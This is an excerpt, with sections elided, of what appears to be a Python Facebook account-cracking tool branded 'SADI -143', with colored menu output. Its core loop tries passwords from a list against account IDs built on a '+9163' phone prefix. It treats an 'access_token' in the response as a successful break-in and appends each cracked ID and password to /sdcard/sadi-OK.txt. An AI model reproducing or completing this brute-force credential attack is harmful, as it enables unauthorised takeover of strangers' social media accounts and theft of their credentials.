...
print('        \x1b[38;0;34m[\033[1;32mSADI -143\x1b[38;0;34m]\033[1;37m')
...
def Main():
    ...
    if me in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/BG.SADI.00")
    if me in ["E","0"]:
        os.system('exit')
    if me in ["N","9"]:
    	tocl()
def xxt():
    ...
    cod ='+9163'
    print("\x1b[38;5;120m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    #os.system('xdg-open https://github.com/SADI -143/')
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                oks.append(ids)
                open('/sdcard/sadi-OK.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
